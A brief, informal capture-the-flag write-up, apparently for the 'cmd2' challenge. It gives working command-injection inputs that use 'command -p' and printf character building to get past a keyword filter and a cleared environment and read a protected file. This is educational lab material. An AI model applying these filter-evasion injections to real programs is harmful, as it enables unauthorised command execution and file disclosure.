./cmd2 "command -p cat cmd2.c"

The above command allows us to execute using the default path,
and allows us to cat the cmd2 file.

However, export FLAG as before won't work, as the env is deleted.

Let's try something else...

printf %c%c%c%c f l a g will print flag

./cmd2 "command -p cat $(printf %c%c%c%c f l a g)"

This almost works, but we run into the same problem as before; the $() is 
executed before entering the program. So we escape $

./cmd2 "command -p cat \$(printf %c%c%c%c f l a g)"

The flag will be needed for cmd3, if I ever get there soooo:
